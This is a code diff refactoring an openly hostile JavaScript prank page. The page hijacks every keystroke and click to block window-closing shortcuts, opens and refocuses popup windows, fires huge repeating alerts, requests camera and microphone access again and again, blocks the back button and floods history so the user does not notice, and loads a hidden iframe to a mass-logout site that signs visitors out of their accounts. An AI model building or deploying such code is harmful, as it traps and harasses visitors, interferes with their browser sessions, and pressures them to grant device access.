@@ -1,21 +1,13 @@
-/*
-  Same as before, but intercept as many shortcuts as possible
-
-  Demo: in Safari
-
-  Also: in Chrome hold down the space key
-*/
-
 const SCREEN_WIDTH = window.screen.availWidth
 const SCREEN_HEIGHT = window.screen.availHeight
-const WINDOW_WIDTH = 480
-const WINDOW_HEIGHT = 260
+const WIN_WIDTH = 480
+const WIN_HEIGHT = 260
 const VELOCITY = 15
 const MARGIN = 10
 const TICK_LENGTH = 50
 
 const ART = [
-`
+  `
 ┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
 ┈┈┈┈╭━━━━━━╮┊☆ ┊┊
 ┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊
@@ -23,8 +15,8 @@ const ART = [
 ┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊
 ☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊
 ┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊
-`,
-`
+  `,
+  `
 ░░▓▓░░░░░░░░▓▓░░
 ░▓▒▒▓░░░░░░▓▒▒▓░
 ░▓▒▒▒▓░░░░▓▒▒▒▓░
@@ -38,7 +30,7 @@ const ART = [
 ░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░
 ░░▓▒▒▒▒▒▒▒▒▒▒▓░░
 ░░░▓▓▓▓▓▓▓▓▓▓░░░
-`
+  `
 ]
 
 const SEARCHES = [
@@ -59,6 +51,22 @@ const SEARCHES = [
   'proof that the earth is flat'
 ]
 
+const VIDEOS = [
+  'nyan.mp4',
+  'cat.mp4',
+  'trolol.mp4'
+]
+
+/**
+ * Array to store the child windows spawned by this window.
+ */
+const wins = []
+
+/*
+ * Run this code in all windows, *both* child and parent windows.
+ */
+init()
+
 /*
  * Use `window.opener` to detect if this window was opened by another window, which
  * will be its parent. The `window.opener` variable is a reference to the parent
@@ -67,25 +75,6 @@ const SEARCHES = [
 if (window.opener) initChildWindow()
 else initParentWindow()
 
-/*
- * Some code always runs in *both* child and parent windows.
- */
-init()
-
-/**
- * Initialization code for child windows.
- */
-function initChildWindow () {
-  moveWindowBounce()
-  showTrollVideo()
-}
-
-/**
- * Initialization code for parent windows.
- */
-function initParentWindow () {
-}
-
 /**
  * Initialization code for *both* parent and child windows.
  */
@@ -93,11 +82,43 @@ function init () {
   confirmPageUnload()
   registerProtocolHandlers()
   requestCameraAndMic()
-  startAlertInterval()
+
+  interceptUserInput(event => {
+    // Prevent default behavior (breaks closing window shortcuts)
+    event.preventDefault()
+    event.stopPropagation()
+
+    enablePictureInPicture()
+    focusWindows()
+    openWindow()
+    requestCameraAndMic()
+  })
 }
 
 /**
- * Ask the user "are you sure you want to leave this page?"
+ * Initialization code for child windows.
+ */
+function initChildWindow () {
+  moveWindowBounce()
+  startVideo()
+  detectWindowClose()
+}
+
+/**
+ * Initialization code for parent windows.
+ */
+function initParentWindow () {
+  startAlertInterval()
+  superLogout()
+  blockBackButton()
+  fillHistory()
+  startInvisiblePictureInPictureVideo()
+}
+
+/**
+ * Ask the user "are you sure you want to leave this page?". In most browsers,
+ * this will not actually do anything unless the user has at least one interaction
+ * with the page before they close it.
  */
 function confirmPageUnload () {
   window.addEventListener('beforeunload', event => {
@@ -136,20 +157,78 @@ function registerProtocolHandlers () {
 }
 
 /**
- * Attempt to access the user's camera and microphone
+ * Show an alert dialog with 1000's of lines of cat ASCII art, at regular intervals
  */
-function requestCameraAndMic () {
-  if (!navigator.mediaDevices ||
-      typeof navigator.mediaDevices.getUserMedia !== 'function') {
-    return
-  }
-  navigator.mediaDevices.getUserMedia({
-    audio: true, video: true
-  }, () => {}, () => {})
+function startAlertInterval () {
+  setInterval(() => {
+    const randomArt = getRandomArrayEntry(ART)
+    const longAlertText = Array(200).join(randomArt)
+    window.alert(longAlertText)
+  }, 15000)
 }
 
 /**
- * Move the window around the screen and bounce off of the screen edges
+ * Intercept all user-initiated events and call the given the function, `onInput`.
+ */
+function interceptUserInput (onInput) {
+  document.body.addEventListener('mousedown', onInput)
+  document.body.addEventListener('click', onInput)
+  document.body.addEventListener('mouseup', onInput)
+  document.body.addEventListener('keydown', onInput)
+  document.body.addEventListener('keypress', onInput)
+  document.body.addEventListener('keyup', onInput)
+}
+
+function startInvisiblePictureInPictureVideo () {
+  const video = document.createElement('video')
+  video.src = './trolol.mp4'
+  video.autoplay = true
+  video.loop = true
+  video.muted = true
+  video.style = 'opacity: 0; height: 1;'
+
+  document.body.appendChild('body')
+}
+
+/**
+ * Active Safari's picture-in-picture feature, which let's show a video on the
+ * desktop. Requires user-initiated event.
+ */
+function enablePictureInPicture () {
+  const video = document.querySelector('video')
+  if (video.webkitSetPresentationMode) {
+    video.muted = false
+    video.webkitSetPresentationMode('picture-in-picture')
+  }
+}
+
+/**
+ * Focus all child windows. Requires user-initiated event.
+ */
+function focusWindows () {
+  wins.forEach(win => {
+    if (!win.closed) win.focus()
+  })
+}
+
+/**
+ * Open a new popup window. Requires user-initiated event.
+ */
+function openWindow () {
+  const { x, y } = getRandomCoords()
+  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
+  const win = window.open(window.location.pathname, '', opts)
+
+  // New windows may be blocked by the popup blocker
+  if (!win) return
+
+  wins.push(win)
+
+  if (wins.length === 1) setupSearchWindow(win)
+}
+
+/**
+ * Move the window around the screen and bounce off of the screen edges.
  */
 function moveWindowBounce () {
   let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
@@ -173,104 +252,96 @@ function moveWindowBounce () {
 /**
  * Show a random troll video in the window.
  */
-function showTrollVideo () {
-  const VIDEOS = [
-    'nyan.mp4',
-    'cat.mp4',
-    'trolol.mp4'
-  ]
-
+function startVideo () {
   const video = document.createElement('video')
 
-  video.src = VIDEOS[Math.floor(Math.random() * VIDEOS.length)]
+  video.src = getRandomArrayEntry(VIDEOS)
   video.autoplay = true
   video.loop = true
+  video.style = 'width: 100%; height: 100%;'
 
   document.body.appendChild(video)
 }
 
 /**
- *
+ * When a child window closes, notify the parent window so it can remove it from
+ * the list of child windows.
  */
-function startAlertInterval () {
-  setInterval(() => {
-    window.alert(Array(100).join(ART[Math.floor(Math.random() * ART.length)]))
-  }, 1000)
-}
-
-// Intercept all shortcuts
-document.body.addEventListener('mousedown', handleUserInput)
-document.body.addEventListener('click', handleUserInput)
-document.body.addEventListener('mouseup', handleUserInput)
-document.body.addEventListener('keydown', handleUserInput)
-document.body.addEventListener('keypress', handleUserInput)
-document.body.addEventListener('keyup', handleUserInput)
-
-function handleUserInput (event) {
-  focusWindows()
-  openWindow()
-
-  requestCameraAndMic()
-
-  const pipVideo = document.querySelector('#pip-video')
-  if (pipVideo.webkitSetPresentationMode) {
-    pipVideo.muted = false
-    pipVideo.webkitSetPresentationMode('picture-in-picture')
-  }
-
-  // Prevent default behavior (breaks closing window shortcuts)
-  event.preventDefault()
-  event.stopPropagation()
-}
-
-if (window.opener) {
-  // *** RUNS IN CHILD WINDOW: ***
-
-  window.onunload = () => {
+function detectWindowClose () {
+  window.addEventListener('unload', () => {
     if (!window.opener.closed) window.opener.onCloseWindow(window)
-  }
+  })
 }
 
-if (!window.opener) {
-  // *** RUNS IN PARENT WINDOW: ***
-
-  const logoutIframe = document.createElement('iframe')
-  logoutIframe.src = 'http://superlogout.com'
-  document.body.appendChild(logoutIframe)
-
-  for (let i = 1; i < 20; i++) {
-    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
+/**
+ * Attempt to access the user's camera and microphone.
+ */
+function requestCameraAndMic () {
+  if (!navigator.mediaDevices ||
+      typeof navigator.mediaDevices.getUserMedia !== 'function') {
+    return
   }
-  window.history.pushState({}, '', window.location.pathname)
+  navigator.mediaDevices.getUserMedia({
+    audio: true, video: true
+  }, () => {}, () => {})
+}
+
+/**
+ * Handle a child window closing.
+ */
+function onCloseWindow (win) {
+  const i = wins.indexOf(win)
+  if (i >= 0) wins.splice(i, 1)
+}
+
+/**
+ * Log the user out of top sites they're logged into, including Google.com.
+ */
+function superLogout () {
+  const logoutIframe = document.createElement('iframe')
+  logoutIframe.src = 'https://superlogout.com'
+  logoutIframe.style = 'width: 1px; height: 1px;'
+  document.body.appendChild(logoutIframe)
+}
+
+/**
+ * Disable the back button. If the user goes back, send them one page forward ;-)
+ */
+function blockBackButton () {
   window.addEventListener('popstate', () => {
     window.history.forward()
   })
-
-
 }
 
-// *** RUNS IN PARENT AND CHILD WINDOWS: ***
-
-// Track created windows in an array
-let wins = []
-
-function openWindow () {
-  const { x, y } = getRandomCoords()
-
-  const win = window.open(window.location.pathname, '', `width=${WINDOW_WIDTH},height=${WINDOW_HEIGHT},left=${x},top=${y}`)
-  if (!win) return
-
-  if (wins.length === 1) {
-    setupSearchWindow(win)
+/**
+ * Fill the history with extra entries for this site, to make it harder to find
+ * the previous site in the back button's dropdown menu.
+ */
+function fillHistory () {
+  for (let i = 1; i < 20; i++) {
+    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
   }
-
-  wins.push(win)
+  // Set location back to the initial location, so user does not notice
+  window.history.pushState({}, '', window.location.pathname)
 }
 
+/**
+ * Get random x, y coordinates for a new window on the screen. Takes into account
+ * screen size, window size, and leaves a safe margin on all sides.
+ */
 function getRandomCoords () {
-  const x = MARGIN + Math.floor(Math.random() * (SCREEN_WIDTH - WINDOW_WIDTH - MARGIN))
-  const y = MARGIN + Math.floor(Math.random() * (SCREEN_HEIGHT - WINDOW_HEIGHT - MARGIN))
+  const x = MARGIN +
+    Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
+  const y = MARGIN +
+    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
   return { x, y }
+}
+
+/**
+ * Get a random element from a given array, `arr`.
+ */
+function getRandomArrayEntry (arr) {
+  return arr[Math.floor(Math.random() * arr.length)]
 }
 
 function setupSearchWindow (win) {
@@ -298,15 +369,4 @@ function setupSearchWindow (win) {
       searchIndex += 1
     }, 500)
   }, 2500)
-}
-
-function focusWindows () {
-  wins.forEach(win => {
-    if (win.focus) win.focus()
-  })
-}
-
-function onCloseWindow (win) {
-  const i = wins.indexOf(win)
-  if (i >= 0) wins.splice(i, 1)
 }
